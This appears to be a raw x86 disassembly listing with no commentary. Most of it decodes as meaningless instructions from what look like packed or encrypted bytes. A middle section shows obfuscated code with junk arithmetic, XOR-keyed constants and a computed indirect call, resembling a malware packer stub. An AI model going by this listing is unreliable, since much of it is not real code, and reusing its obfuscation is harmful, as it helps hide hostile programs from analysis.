  40cd85:	add    BYTE PTR [edi+ebx*1],ah
  40cd88:	rcl    DWORD PTR [ebx-0x19],1
  40cd8b:	lods   al,BYTE PTR ds:[esi]
  40cd8c:	mov    ecx,0x7bc553e1
  40cd91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd92:	int3   
  40cd93:	aad    0x7e
  40cd95:	xchg   BYTE PTR [ebx-0x7ffbfa09],cl
  40cd9b:	xchg   edx,eax
  40cd9c:	cli    
  40cd9d:	ret    0xc3cd
  40cda0:	xchg   edi,eax
  40cda1:	dec    eax
  40cda2:	lods   al,BYTE PTR ds:[esi]
  40cda3:	mov    bl,0xe
  40cda5:	push   ds
  40cda6:	push   ebp
  40cda7:	into   
  40cda8:	loop   0x40ce13
  40cdaa:	rol    ah,1
  40cdac:	jb     0x40cd5e
  40cdae:	xchg   esp,eax
  40cdaf:	xchg   esi,eax
  40cdb0:	adc    eax,0xbe0d865
  40cdb5:	mov    ds:0x64352adf,eax
  40cdba:	push   ds
  40cdbb:	or     al,0x55
  40cdbd:	mov    ecx,DWORD PTR [ebx+0x2f]
  40cdc0:	popf   
  40cdc1:	add    DWORD PTR [ebp-0x41424123],0xb9ec48eb
  40cdcb:	inc    eax
  40cdcc:	pop    ebp
  40cdcd:	pop    eax
  40cdce:	xchg   edx,eax
  40cdcf:	sub    esp,esi
  40cdd1:	(bad)  
  40cdd2:	jb     0x40cdcb
  40cdd4:	clc    
  40cdd5:	jmp    0x9353:0xe6568310
  40cddc:	fsub   QWORD PTR [edx]
  40cdde:	loopne 0x40ce39
  40cde0:	clc    
  40cde1:	adc    cl,cl
  40cde3:	inc    ecx
  40cde4:	xor    ah,al
  40cde6:	mov    eax,ds:0xbbd6e87b
  40cdeb:	hlt    
  40cdec:	pop    edi
  40cded:	mov    edi,0x5444427e
  40cdf2:	outs   dx,DWORD PTR ds:[esi]
  40cdf3:	fistp  QWORD PTR [edx-0x80]
  40cdf6:	iret   
  40cdf7:	dec    ebp
  40cdf8:	inc    DWORD PTR [edi-0x38abad1f]
  40cdfe:	mov    ds:0xf273052c,al
  40ce03:	pusha  
  40ce04:	sbb    BYTE PTR ds:0xcb71bfbc,bh
  40ce0a:	fisttp QWORD PTR [eax]
  40ce0c:	mov    al,ds:0xbba21609
  40ce11:	push   ebp
  40ce12:	lds    ebx,FWORD PTR [ebx]
  40ce14:	rcl    DWORD PTR [edx-0x2f8fd73c],1
  40ce1a:	add    esi,DWORD PTR fs:[ebp+0x62]
  40ce1e:	mov    dh,0xf3
  40ce20:	mov    ds:0x584d9f4f,al
  40ce25:	pop    ebx
  40ce26:	popa   
  40ce27:	or     ebx,DWORD PTR [ecx-0x4ae5f32a]
  40ce2d:	pop    esi
  40ce2e:	jnp    0x40ce8f
  40ce30:	lock pusha 
  40ce32:	jp     0x40ceaf
  40ce34:	inc    ecx
  40ce35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce36:	dec    esi
  40ce37:	test   eax,0x68d045de
  40ce3c:	ins    BYTE PTR es:[edi],dx
  40ce3d:	xchg   ah,al
  40ce3f:	mov    gs,WORD PTR [esi-0x6e267cf3]
  40ce45:	jmp    0x798a70b8
  40ce4a:	mov    WORD PTR [esi],cs
  40ce4c:	ja     0x40ceb9
  40ce4e:	and    esi,DWORD PTR [ecx]
  40ce50:	repz and edx,DWORD PTR [edx+0xaf3ce95]
  40ce57:	mov    esi,0xca165d91
  40ce5c:	mov    DWORD PTR [eax],eax
  40ce5e:	dec    ecx
  40ce5f:	fbstp  TBYTE PTR [ecx]
  40ce61:	pusha  
  40ce62:	cmp    BYTE PTR [ecx],bl
  40ce64:	sub    al,0xf
  40ce66:	push   edx
  40ce67:	sbb    BYTE PTR [edx+0x0],dh
  40ce6a:	xchg   edx,eax
  40ce6b:	icebp  
  40ce6c:	inc    esi
  40ce6d:	icebp  
  40ce6e:	add    DWORD PTR [esi+0x48],edx
  40ce71:	pop    ds
  40ce72:	mov    edi,0xb7fc3765
  40ce77:	iret   
  40ce78:	lahf   
  40ce79:	daa    
  40ce7a:	and    eax,DWORD PTR [edx+0x19]
  40ce7d:	nop
  40ce7e:	and    al,0xe6
  40ce80:	out    0x44,al
  40ce82:	adc    cl,dh
  40ce84:	mov    bh,BYTE PTR [edx-0x5a]
  40ce87:	or     BYTE PTR [esi],bl
  40ce89:	mov    bh,0x9b
  40ce8b:	dec    ebx
  40ce8c:	dec    edi
  40ce8d:	in     al,0xea
  40ce8f:	and    al,0xdb
  40ce91:	dec    edx
  40ce92:	or     bl,BYTE PTR [eax+0x3a]
  40ce95:	push   cs
  40ce96:	mov    dh,0xeb
  40ce98:	dec    edi
  40ce99:	je     0x40cecf
  40ce9b:	mov    BYTE PTR [ebx],cl
  40ce9d:	sbb    DWORD PTR [esi+0x65],eax
  40cea0:	call   DWORD PTR [edi]
  40cea2:	outs   dx,DWORD PTR ds:[esi]
  40cea3:	out    dx,al
  40cea4:	sub    BYTE PTR [edx],bl
  40cea6:	dec    eax
  40cea7:	xor    ebx,DWORD PTR [bx+0x76]
  40ceab:	add    esp,DWORD PTR [eax-0x3d741c28]
  40ceb1:	dec    edi
  40ceb2:	mov    dl,0x50
  40ceb4:	(bad)  
  40ceb5:	jmp    0xabd0c97a
  40ceba:	mov    bl,0xcc
  40cebc:	ins    BYTE PTR es:[edi],dx
  40cebd:	cdq    
  40cebe:	mov    ch,0xff
  40cec0:	aas    
  40cec1:	add    eax,0x7901ff09
  40cec6:	sar    DWORD PTR [ecx-0x269fb759],1
  40cecc:	fmul   st(3),st
  40cece:	retf   0xe41f
  40ced1:	add    al,0x18
  40ced3:	inc    edx
  40ced4:	xchg   edi,eax
  40ced5:	pushf  
  40ced6:	sbb    dh,dh
  40ced8:	pop    ebp
  40ced9:	fiadd  WORD PTR [edx-0x39]
  40cedc:	pop    ebx
  40cedd:	out    0xcf,al
  40cedf:	retf   0xd913
  40cee2:	xchg   esp,eax
  40cee3:	cld    
  40cee4:	cli    
  40cee5:	dec    esp
  40cee6:	enter  0xdcd8,0xe7
  40ceea:	inc    ebx
  40ceeb:	ja     0x40cf3c
  40ceed:	mov    bh,ch
  40ceef:	pop    esi
  40cef0:	hlt    
  40cef1:	rcr    DWORD PTR [ecx+0x20],0x6d
  40cef5:	(bad)  
  40cef7:	jl     0x40ce8f
  40cef9:	das    
  40cefa:	xor    al,0xb0
  40cefc:	popa   
  40cefd:	ins    DWORD PTR es:[edi],dx
  40cefe:	mov    WORD PTR [eax-0x63],es
  40cf01:	push   ss
  40cf02:	push   ds
  40cf03:	gs jbe 0x40cf32
  40cf06:	sbb    ebx,DWORD PTR [ecx+0x74a7fcd9]
  40cf0c:	lea    esi,[ebx]
  40cf0e:	pop    eax
  40cf0f:	or     cl,BYTE PTR [ebx+0x3d]
  40cf12:	cwde   
  40cf13:	pop    esp
  40cf14:	adc    dh,0x64
  40cf17:	and    DWORD PTR [edi-0x5f],edx
  40cf1a:	mov    esi,0x3d3ec717
  40cf1f:	jl     0x40cef4
  40cf21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf22:	push   cs
  40cf23:	adc    bl,bh
  40cf25:	xchg   ebx,eax
  40cf26:	jnp    0x40cf7f
  40cf28:	sti    
  40cf29:	sub    BYTE PTR [edx+0x11e14f9c],bl
  40cf2f:	sti    
  40cf30:	add    edi,eax
  40cf32:	dec    esi
  40cf33:	jns    0x40cfae
  40cf35:	sbb    al,0x7b
  40cf37:	push   ebx
  40cf38:	nop
  40cf39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf3a:	out    dx,al
  40cf3b:	imul   ebp,ebp,0xf1675098
  40cf41:	dec    esp
  40cf42:	lods   al,BYTE PTR ds:[esi]
  40cf43:	les    edi,FWORD PTR [edx-0x3d]
  40cf46:	inc    esi
  40cf47:	push   0x52
  40cf49:	mov    esp,0x8410d5a0
  40cf4e:	pop    es
  40cf4f:	sbb    DWORD PTR [ebp-0x7a],esp
  40cf52:	idiv   BYTE PTR [edx+0xd]
  40cf55:	pop    ecx
  40cf56:	mov    dl,dl
  40cf58:	jp     0x40cf7e
  40cf5a:	dec    eax
  40cf5b:	into   
  40cf5c:	jp     0x40cfb1
  40cf5e:	retf   0xb28d
  40cf61:	pop    es
  40cf62:	jne    0x40cef6
  40cf64:	and    DWORD PTR [edi],ebx
  40cf66:	lahf   
  40cf67:	mov    cl,0x33
  40cf69:	(bad)  
  40cf6a:	stos   BYTE PTR es:[edi],al
  40cf6b:	jl     0x40cf6e
  40cf6d:	out    0x37,al
  40cf6f:	mov    DWORD PTR [edi+0x5e67ae0a],ebp
  40cf75:	gs cwde 
  40cf77:	dec    ecx
  40cf78:	push   es
  40cf79:	push   esi
  40cf7a:	aas    
  40cf7b:	scas   eax,DWORD PTR es:[edi]
  40cf7c:	jl     0x40cf95
  40cf7e:	mov    dh,0x9c
  40cf80:	stc    
  40cf81:	or     BYTE PTR [edx+0x5b091ed2],dl
  40cf87:	and    eax,0x5758c0a1
  40cf8c:	(bad)  
  40cf8d:	mov    eax,ds:0x76bbbf6b
  40cf92:	push   es
  40cf93:	lock out dx,eax
  40cf95:	mov    edx,0xf7b44f7
  40cf9a:	jecxz  0x40cf47
  40cf9c:	mov    ah,0x13
  40cf9e:	mov    eax,esi
  40cfa0:	inc    edx
  40cfa1:	jmp    0x40cf4a
  40cfa3:	adc    eax,0x1216203b
  40cfa8:	jno    0x40cf77
  40cfaa:	mov    edx,0x4033b20a
  40cfaf:	cmp    ebp,DWORD PTR [esi+0x0]
  40cfb2:	fdivr  QWORD PTR [esi]
  40cfb4:	dec    edx
  40cfb5:	mov    al,ds:0x60cbb81
  40cfba:	dec    ecx
  40cfbb:	dec    edi
  40cfbc:	ds std 
  40cfbe:	pop    edx
  40cfbf:	cld    
  40cfc0:	or     al,0x4e
  40cfc2:	imul   ebp,DWORD PTR [ecx-0x28],0x60
  40cfc6:	cmp    BYTE PTR [ebx-0x2c79ff9a],dh
  40cfcc:	ja     0x40cf66
  40cfce:	mov    ds:0x29c71077,eax
  40cfd3:	dec    edi
  40cfd4:	jnp    0x40d017
  40cfd6:	pop    ebx
  40cfd7:	mov    eax,0xa685965c
  40cfdc:	arpl   WORD PTR [esi+edi*4],sp
  40cfdf:	icebp  
  40cfe0:	pop    ds
  40cfe1:	dec    dl
  40cfe3:	jl     0x40d00e
  40cfe5:	clc    
  40cfe6:	cmp    eax,DWORD PTR ds:0xaf9edeb9
  40cfec:	mov    al,0x96
  40cfee:	inc    ecx
  40cfef:	push   ecx
  40cff0:	sbb    al,0xaa
  40cff2:	adc    BYTE PTR [eax-0xe],dl
  40cff5:	int    0xb6
  40cff7:	ss (bad) 
  40cff9:	xchg   edi,eax
  40cffa:	daa    
  40cffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cffc:	mov    ds:0xccb35acd,al
  40d001:	mov    ds:0x3ab0b2bb,eax
  40d006:	and    BYTE PTR [eax-0x4d698cfe],dl
  40d00c:	mov    al,ds:0x9438718f
  40d011:	add    BYTE PTR [ebx-0x351ab242],bl
  40d017:	retf   0x73e7
  40d01a:	push   0xffffffd6
  40d01c:	jbe    0x40d019
  40d01e:	xchg   edi,eax
  40d01f:	dec    eax
  40d020:	pop    edx
  40d021:	xor    ah,bl
  40d023:	dec    ebp
  40d024:	sti    
  40d025:	sub    ah,cl
  40d027:	inc    ecx
  40d028:	dec    eax
  40d029:	lahf   
  40d02a:	cmovo  ebp,edx
  40d02d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d02f:	in     eax,0x76
  40d031:	dec    esi
  40d032:	sbb    BYTE PTR [ebx-0x74],al
  40d035:	sbb    dh,BYTE PTR [edi+0x56de59c9]
  40d03b:	push   ecx
  40d03c:	rcl    BYTE PTR [ebx+eax*4],0xb5
  40d040:	imul   ecx,DWORD PTR [edi],0x8a8edb81
  40d046:	fucomp st(1)
  40d048:	mov    ds:0xada5a11,al
  40d04d:	jb     0x40d078
  40d04f:	pop    eax
  40d050:	lods   al,BYTE PTR ds:[esi]
  40d051:	mov    BYTE PTR [ebp+eiz*1-0x7c],dl
  40d055:	pushf  
  40d056:	clc    
  40d057:	stos   DWORD PTR es:[edi],eax
  40d058:	inc    esp
  40d059:	add    ch,BYTE PTR ds:0xdfd5c9cc
  40d05f:	xchg   esp,ebx
  40d061:	sbb    esi,DWORD PTR [edi]
  40d063:	test   bl,0x16
  40d066:	xor    bl,ch
  40d068:	mov    ax,ds:0xb2b1373e
  40d06e:	loope  0x40d083
  40d070:	sub    eax,0xd8d67106
  40d075:	nop
  40d076:	xchg   edx,eax
  40d077:	mov    cl,0xf8
  40d079:	push   ds
  40d07a:	jle    0x40d084
  40d07c:	mov    ebp,0x6e4edba9
  40d081:	xchg   ebp,eax
  40d082:	sti    
  40d083:	popf   
  40d084:	cmp    eax,DWORD PTR [ebx+0x74]
  40d087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d088:	xor    dh,BYTE PTR [esi-0x2e24cda7]
  40d08e:	test   al,0xda
  40d090:	xor    eax,0x8d91b105
  40d095:	loope  0x40d0d6
  40d097:	sub    al,0xfb
  40d099:	push   esi
  40d09a:	aad    0xe0
  40d09c:	mov    eax,ds:0xcdb1b898
  40d0a1:	jmp    0x605a83cd
  40d0a6:	and    DWORD PTR [edi+0x48],eax
  40d0a9:	xchg   esi,eax
  40d0aa:	push   0xffffff90
  40d0ac:	hlt    
  40d0ad:	mov    eax,ds:0x82f30038
  40d0b2:	dec    esi
  40d0b3:	pop    ecx
  40d0b4:	jmp    0x40d070
  40d0b6:	sub    al,BYTE PTR [edx+0x5e9bf768]
  40d0bc:	jo     0x40d0af
  40d0be:	mov    al,0x99
  40d0c0:	fwait
  40d0c1:	je     0x40d063
  40d0c3:	call   0x919704d4
  40d0c8:	outs   dx,DWORD PTR ds:[esi]
  40d0c9:	rcr    BYTE PTR [edi],cl
  40d0cb:	mov    ch,0x90
  40d0cd:	sbb    ebx,ebx
  40d0cf:	inc    esp
  40d0d0:	loope  0x40d0ba
  40d0d2:	or     cl,BYTE PTR [esi+esi*8-0x7d]
  40d0d6:	pop    es
  40d0d7:	jl     0x40d116
  40d0d9:	adc    DWORD PTR [edx+0x4b],ecx
  40d0dc:	jecxz  0x40d10d
  40d0de:	jle    0x40d15b
  40d0e0:	cmp    eax,0x55e95a1b
  40d0e5:	inc    esp
  40d0e6:	xor    al,0x9d
  40d0e8:	nop
  40d0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ea:	ror    BYTE PTR [edi],1
  40d0ec:	sbb    esp,edi
  40d0ee:	mov    edi,0xe946a14e
  40d0f3:	lahf   
  40d0f4:	jle    0x40d11b
  40d0f6:	retf   0xbcd5
  40d0f9:	imul   ebp
  40d0fb:	add    BYTE PTR [eax],0x54
  40d0fe:	ja     0x40d100
  40d100:	xlat   BYTE PTR ds:[ebx]
  40d101:	arpl   WORD PTR [esi],dx
  40d103:	add    bh,0xf1
  40d106:	aam    0x81
  40d108:	loop   0x40d0af
  40d10a:	in     eax,0xbd
  40d10c:	mov    edi,0x4a6c0ae4
  40d111:	repz test BYTE PTR [eax+0x417a143c],ch
  40d118:	jge    0x40d120
  40d11a:	cmp    eax,0x1c60c043
  40d11f:	or     DWORD PTR [ebx],0xfe210f7c
  40d125:	and    DWORD PTR [ebx-0x5c11b627],edi
  40d12b:	stos   BYTE PTR es:[edi],al
  40d12c:	mov    BYTE PTR [esi+0x6b6d5f56],dl
  40d132:	mov    BYTE PTR [esi],bh
  40d134:	or     edx,DWORD PTR [ebx]
  40d136:	jl     0x40d196
  40d138:	push   cs
  40d139:	dec    esi
  40d13a:	mov    ebp,0xe65423b1
  40d13f:	rcl    BYTE PTR [eax+ebx*8+0x51],0x8
  40d144:	addr16 push edi
  40d146:	clc    
  40d147:	in     eax,dx
  40d148:	lea    edi,[ebx+ebx*4+0x50137388]
  40d14f:	jl     0x40d167
  40d151:	mov    ah,0x83
  40d153:	jns    0x40d1a4
  40d155:	adc    al,0xc0
  40d157:	sbb    eax,DWORD PTR [ebp+ecx*1-0x69]
  40d15b:	jns    0x40d14a
  40d15d:	jle    0x40d1da
  40d15f:	mov    ecx,0xb337ee34
  40d164:	add    DWORD PTR [eax],edi
  40d166:	push   cs
  40d167:	adc    al,ch
  40d169:	push   cs
  40d16a:	ss das 
  40d16c:	sub    ecx,DWORD PTR [ecx+0x19]
  40d16f:	adc    DWORD PTR [ebx],edx
  40d171:	(bad)  
  40d172:	mov    eax,0xb96aee88
  40d177:	je     0x40d14a
  40d179:	fisubr DWORD PTR [esp+ebp*8+0x75ca9b7b]
  40d180:	add    al,0xbb
  40d183:	mov    al,ds:0xbbc1084f
  40d188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d189:	mov    ds:0x7347f00b,al
  40d18e:	retf   0xf1d5
  40d191:	mov    ds:0x89257985,al
  40d196:	in     al,dx
  40d197:	pop    ebx
  40d198:	sbb    DWORD PTR [ecx],edi
  40d19a:	repnz sub edx,DWORD PTR [eax-0x67a09bde]
  40d1a1:	daa    
  40d1a2:	ja     0x40d1bb
  40d1a4:	pop    edi
  40d1a5:	rol    DWORD PTR [edx+0x4],0xe7
  40d1a9:	jnp    0x40d181
  40d1ab:	and    bl,BYTE PTR [ecx+0x33]
  40d1ae:	mov    edi,0xcc4df8d1
  40d1b3:	xchg   ebx,eax
  40d1b4:	or     bh,BYTE PTR [ebx]
  40d1b6:	push   0xfffffff4
  40d1b8:	ja     0x40d1af
  40d1ba:	imul   ecx,DWORD PTR [eax-0x573fb183],0x613ccb33
  40d1c4:	stos   DWORD PTR es:[edi],eax
  40d1c5:	dec    edi
  40d1c6:	minps  xmm6,XMMWORD PTR [edi-0x50e8c62e]
  40d1cd:	xor    ch,al
  40d1cf:	ins    BYTE PTR es:[edi],dx
  40d1d0:	into   
  40d1d1:	cmp    BYTE PTR [ebp+0x5f],bl
  40d1d4:	sbb    al,0x7e
  40d1d6:	jb     0x40d249
  40d1d8:	leave  
  40d1d9:	loopne 0x40d220
  40d1db:	icebp  
  40d1dc:	pop    ecx
  40d1dd:	cmp    bl,BYTE PTR cs:[esi+0x437d2198]
  40d1e4:	dec    edx
  40d1e5:	jge    0x40d1c4
  40d1e7:	div    BYTE PTR [edx]
  40d1e9:	stos   DWORD PTR es:[edi],eax
  40d1ea:	push   esi
  40d1eb:	(bad)  
  40d1ec:	mov    ds:0x87a13002,eax
  40d1f1:	pextrw ecx,(bad),0xc5
  40d1f3:	dec    eax
  40d1f4:	loopne 0x40d219
  40d1f6:	mov    ebx,0xd6cdae23
  40d1fb:	jo     0x40d1a5
  40d1fd:	bound  ebx,QWORD PTR ds:0x275be69e
  40d203:	pop    ecx
  40d204:	cmp    ah,BYTE PTR [eax]
  40d206:	stc    
  40d207:	retf   0x761
  40d20a:	lea    eax,[ecx-0x2ddb2540]
  40d210:	iret   
  40d211:	aas    
  40d212:	jecxz  0x40d1a9
  40d214:	scas   al,BYTE PTR es:[edi]
  40d215:	je     0x40d1fc
  40d217:	xchg   ebx,eax
  40d218:	xlat   BYTE PTR ds:[ebx]
  40d219:	mov    ds:0x673fad7b,al
  40d21e:	inc    DWORD PTR [eax+0x54652354]
  40d224:	nop
  40d225:	adc    al,0x7f
  40d227:	pop    edx
  40d228:	sbb    eax,0xae792e3f
  40d22d:	mov    ch,BYTE PTR [edx+0x73]
  40d230:	rol    DWORD PTR [ebx],1
  40d232:	pop    ebp
  40d233:	and    ch,BYTE PTR [esi+0x31264f4c]
  40d239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d23a:	xor    al,0xf2
  40d23c:	xchg   edx,eax
  40d23d:	fcmovnbe st,st(4)
  40d23f:	ret    0x30d3
  40d242:	sbb    BYTE PTR [ebp-0x67],dh
  40d245:	jmp    0xc76828d2
  40d24a:	jecxz  0x40d1df
  40d24c:	add    cl,0x58
  40d24f:	add    al,0xbe
  40d251:	popa   
  40d252:	mov    esi,0xc0f45221
  40d257:	jge    0x40d27f
  40d259:	cli    
  40d25a:	iret   
  40d25b:	xchg   edi,eax
  40d25c:	inc    edi
  40d25d:	int3   
  40d25e:	fmul   DWORD PTR [ebp+0x4efc3909]
  40d264:	xlat   BYTE PTR ds:[ebx]
  40d265:	push   ecx
  40d266:	repnz or al,cl
  40d269:	dec    eax
  40d26a:	pop    ebx
  40d26b:	adc    ebp,ecx
  40d26d:	mov    al,ds:0x355e97a
  40d272:	pop    esp
  40d273:	fisttp QWORD PTR [esp+edx*2]
  40d276:	aas    
  40d277:	push   ss
  40d278:	stos   BYTE PTR es:[edi],al
  40d279:	xchg   DWORD PTR [ebp+0x3bf92a0f],edx
  40d27f:	call   0x7dbb:0x8a741a2b
  40d286:	adc    eax,0x6da7e68f
  40d28b:	stc    
  40d28c:	ret    0x2b99
  40d28f:	jle    0x40d2fc
  40d291:	mov    bh,0xec
  40d293:	mov    edx,0xf0d71f9b
  40d298:	mov    eax,DWORD PTR [ebp-0x1c]
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d496
  40d43c:	fnsave [eax-0x51]
  40d43f:	sbb    ch,BYTE PTR [edx]
  40d441:	jnp    0x40d4be
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	mov    edi,0x594e23e7
  40d44c:	das    
  40d44d:	sar    al,cl
  40d44f:	push   esp
  40d450:	and    sp,cx
  40d453:	mov    bl,0x5
  40d455:	gs xchg ebx,eax
  40d457:	jnp    0x40d4d8
  40d459:	inc    ecx
  40d45a:	cmc    
  40d45b:	mov    ?,edi
  40d45d:	lods   al,BYTE PTR ds:[esi]
  40d45e:	in     eax,0x6f
  40d460:	sub    eax,0x4cd467d
  40d465:	and    BYTE PTR [eax],dl
  40d467:	jns    0x40d466
  40d469:	jmp    0xd49ff6c0
  40d46e:	scas   eax,DWORD PTR es:[edi]
  40d46f:	hlt    
  40d470:	cmp    bh,dh
  40d472:	ins    DWORD PTR es:[edi],dx
  40d473:	jp     0x40d42b
  40d475:	jecxz  0x40d45e
  40d477:	inc    DWORD PTR [eax+ebx*1+0x1409b5b1]
  40d47e:	dec    ecx
  40d47f:	cmc    
  40d480:	mov    ds:0x1abec5e2,al
  40d485:	fbld   TBYTE PTR [edx-0x40]
  40d488:	shl    DWORD PTR [ebx+ebp*8],cl
  40d48b:	popf   
  40d48c:	pusha  
  40d48d:	test   al,0x70
  40d48f:	push   ebx
  40d490:	js     0x40d4e7
  40d492:	icebp  
  40d493:	push   ds
  40d494:	shl    BYTE PTR [edi-0x3a],cl
  40d497:	sar    dl,0x10
  40d49a:	test   esi,esp
  40d49c:	mov    esi,0x6f9cc1a7
  40d4a1:	inc    ecx
  40d4a2:	(bad)  
  40d4a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4a4:	pop    ebp
  40d4a5:	mov    bl,0x11
  40d4a7:	aam    0x30
  40d4a9:	ret    
  40d4aa:	mov    ecx,0xac621405
  40d4af:	popf   
  40d4b0:	fcomi  st,st(4)
  40d4b2:	pop    ss
  40d4b3:	inc    eax
  40d4b4:	push   ds
  40d4b5:	out    dx,eax
  40d4b6:	push   ebp
  40d4b7:	inc    ebx
  40d4b8:	mov    cl,0x4d
  40d4ba:	fisubr WORD PTR [ecx+0xb]
  40d4bd:	ss jb  0x40d4cf
  40d4c0:	js     0x40d4b1
  40d4c2:	out    0xd8,al
  40d4c4:	inc    esp
  40d4c5:	push   ebp
  40d4c6:	jmp    0x35bf:0x5b258ebc
  40d4cd:	mov    al,0xc7
  40d4cf:	(bad)  
  40d4d0:	das    
  40d4d1:	mov    ds:0x52832d19,eax
